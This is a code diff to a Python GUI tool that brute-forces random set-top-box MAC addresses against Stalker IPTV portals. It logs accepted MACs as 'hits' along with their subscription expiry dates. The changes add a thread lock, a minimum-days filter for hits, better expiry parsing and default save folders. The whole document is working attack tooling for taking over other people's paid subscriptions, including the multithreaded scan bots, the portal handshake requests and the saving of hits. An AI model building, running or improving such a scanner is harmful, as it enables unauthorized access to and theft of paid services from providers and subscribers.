@@ -62,12 +62,14 @@ pause_condition = threading.Condition()
 threads = []
 server_url = ""
 use_stalker_c = True  # Control whether stalker portals append /c/
+min_days = 1
+lock = threading.Lock()
 
 # Predefined MAC prefixes
 mac_prefixes = [
     'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:',
     '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:',
-    '00:A1:79:', '00:1B:79:', '00:2A:79:', '00:2A:01:'
+    '00:A1:79:', '00:1B:79:', '00:2A:01:'
 ]
 
 # Default MAC prefix
@@ -207,7 +209,7 @@ def parse_expiration_date(date_str):
         timestamp = time.mktime(date_obj.timetuple())
         return int((timestamp - time.time()) / 86400)
     except:
-        return ""
+        return None
 
 # Generate random MAC address
 def generate_mac(prefix=default_mac_prefix):
@@ -249,22 +251,9 @@ def hea2(macs, token):
 def format_hit(mac_address, expiration_date, hit_queue, server_url, total_scans, scan_attempts):
     global hit_count
     try:
-        # Remove time indication (e.g., '11:59 am')
-        expiration_date = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', expiration_date, flags=re.IGNORECASE).strip()
-
-        # Check for negative or <0 day
-        if "Days" in expiration_date:
-            days_str = expiration_date.split(" ")[-2]
-            try:
-                days = int(days_str)
-                if days < 0:
-                    return
-                if days < 1:
-                    return
-            except ValueError:
-                pass
-
-        if mac_address not in seen_macs:
+        with lock:
+            if mac_address in seen_macs:
+                return
             seen_macs.add(mac_address)
             hit_data = f"""
 Date: {time.strftime('%d-%m-%Y %H:%M:%S')}
@@ -273,6 +262,7 @@ Mac: {mac_address}
 Valid until: {expiration_date}
 ------
 """
+            print(hit_data)
             hit_queue.put((time.strftime('%d-%m-%Y %H:%M:%S'), f"http://{server_url}{base_uri}", mac_address, expiration_date))
             with open(output_file, 'a+', encoding='utf-8') as file:
                 file.write(hit_data + '\n')
@@ -318,10 +308,6 @@ def scan_bot(bot_number, scan_attempts, bot_count, server_url, mac_prefix, statu
             total_scans += 1
         mac_address = generate_mac(mac_prefix)
         encoded_mac = mac_address.upper().replace(':', '%3A')
-
-        motion = random.randint(0, 1)
-        if motion == 1:
-            continue
 
         # Define API URLs
         handshake_url = f"http://{server_url}/{portal_endpoint}?type=stb&action=handshake&token&prehash&JsHttpRequest=1-xml"
@@ -378,20 +364,41 @@ def scan_bot(bot_number, scan_attempts, bot_count, server_url, mac_prefix, statu
                             break
 
                 if data.count('phone') != 0:
-                    expiration_date = ""
+                    raw_expiration = ""
                     if 'end_date' in data:
-                        expiration_date = data.split('end_date":"')[1].split('"')[0]
+                        raw_expiration = data.split('end_date":"')[1].split('"')[0]
                     else:
                         try:
-                            expiration_date = data.split('phone":"')[1].split('"')[0]
-                            if expiration_date.lower()[:2] == 'un':
-                                days_remaining = " Days"
-                            else:
-                                days_remaining = f"{parse_expiration_date(expiration_date)} Days"
-                                expiration_date = expiration_date + ' ' + days_remaining
+                            raw_expiration = data.split('phone":"')[1].split('"')[0]
                         except:
                             pass
-                    format_hit(mac_address, expiration_date, hit_queue, server_url, total_scans, scan_attempts)
+
+                    if raw_expiration:
+                        # Remove time indication (e.g., '11:59 am')
+                        raw_expiration = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', raw_expiration, flags=re.IGNORECASE).strip()
+
+                        expiration_date = raw_expiration
+                        days = None
+                        if raw_expiration.lower().startswith('un'):
+                            days = float('inf')
+                            expiration_date = "Unlimited"
+                        else:
+                            days = parse_expiration_date(raw_expiration)
+                            if days is not None:
+                                expiration_date = f"{raw_expiration} ({days} Days)"
+                            else:
+                                try:
+                                    date_obj = datetime.datetime.strptime(raw_expiration, '%Y-%m-%d')
+                                    days = (date_obj - datetime.datetime.now()).days
+                                    expiration_date = f"{raw_expiration} ({days} Days)"
+                                except:
+                                    pass
+
+                        if days is not None:
+                            if days < min_days:
+                                print(f"Skipping hit with less than {min_days} days: {mac_address} ({expiration_date})")
+                                continue
+                        format_hit(mac_address, expiration_date, hit_queue, server_url, total_scans, scan_attempts)
 
 # Tooltip class for input field guidance
 class Tooltip:
@@ -447,6 +454,7 @@ class IptvScannerGUI:
         self.mac_prefix = tk.StringVar(value="00:1A:79")
         self.scan_attempts = tk.StringVar(value="1000")
         self.bot_count = tk.StringVar(value="5")
+        self.min_days = tk.StringVar(value="1")
         self.output_file = tk.StringVar(value="")
         self.portal_type = tk.StringVar(value="")
         self.hit_queue = Queue()
@@ -478,6 +486,11 @@ class IptvScannerGUI:
         self.bot_count_entry = tk.Entry(input_frame, textvariable=self.bot_count, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
         self.bot_count_entry.grid(row=3, column=1, padx=10, pady=8, sticky="ew")
         Tooltip(self.bot_count_entry, "Number of parallel scan threads")
+
+        tk.Label(input_frame, text="Minimum Days:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=4, column=0, padx=10, pady=8, sticky="e")
+        self.min_days_entry = tk.Entry(input_frame, textvariable=self.min_days, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
+        self.min_days_entry.grid(row=4, column=1, padx=10, pady=8, sticky="ew")
+        Tooltip(self.min_days_entry, "Minimum days to save hit (default: 1)")
 
         # Portal detection frame
         portal_frame = tk.Frame(main_frame, bg="#1E1E1E")
@@ -619,10 +632,19 @@ class IptvScannerGUI:
             portal_name = parsed_url.hostname or "UnknownPortal"
             portal_name = portal_name.split(':')[0]
         portal_name = re.sub(r'[^\w\-_\.]', '_', portal_name)
-        current_time = time.strftime("%d-%m-%Y_%H-%M-%S")
-        default_filename = f"SimpleIptv_{portal_name}_{current_time}.txt"
+        current_time = time.strftime("%d-%m-%Y")
+        default_filename = f"{portal_name}_SimpleIptv_{current_time}.txt"
+
+        if platform.system() == 'Linux' and os.path.exists('/storage/emulated/0'):
+            initial_dir = "/storage/emulated/0/Downloads/"
+        else:
+            home = os.path.expanduser("~")
+            initial_dir = os.path.join(home, "Downloads")
+        if not os.path.exists(initial_dir):
+            os.makedirs(initial_dir)
 
         file_path = filedialog.asksaveasfilename(
+            initialdir=initial_dir,
             defaultextension=".txt",
             filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
             initialfile=default_filename
@@ -658,7 +680,7 @@ class IptvScannerGUI:
         self.status_label.config(text="Status: Idle")
 
     def validate_inputs(self):
-        global server_url, default_mac_prefix, base_uri, portal_endpoint
+        global server_url, default_mac_prefix, base_uri, portal_endpoint, min_days
         server_url = self.server_url.get().strip()
         if not server_url:
             messagebox.showerror("Error", "Portal URL is required.")
@@ -688,6 +710,15 @@ class IptvScannerGUI:
                 return False
         except ValueError:
             messagebox.showerror("Error", "Invalid number for bot count.")
+            return False
+
+        try:
+            min_days = int(self.min_days.get())
+            if min_days < 0:
+                messagebox.showerror("Error", "Minimum days must be a non-negative number.")
+                return False
+        except ValueError:
+            messagebox.showerror("Error", "Invalid number for minimum days.")
             return False
 
         if not output_file:
